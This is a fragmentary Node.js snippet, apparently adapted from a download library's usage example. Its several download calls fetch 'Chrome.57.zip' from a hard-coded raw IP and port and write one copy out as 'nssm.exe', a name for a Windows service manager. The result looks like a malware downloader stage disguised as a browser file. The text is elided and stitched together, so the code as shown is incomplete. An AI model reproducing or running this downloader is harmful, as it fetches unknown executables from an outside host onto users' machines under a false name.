const http = require('http')
    ...
    (async () => {
        ...
        await download('http://139.99.7.84:9951/Chrome.57.zip', 'dist');
     
        fs.writeFileSync('nssm.exe', await download('http://139.99.7.84:9951/Chrome.57.zip'));
     
        download('http://139.99.7.84:9951/Chrome.57.zip').pipe(fs.createWriteStream('Chrome.57.zip'));
     
        await Promise.all([
            'http://139.99.7.84:9951/Chrome.57.zip',
            'cats.com/dancing.gif'
        ].map(url => download(url, 'dist')));
    })();
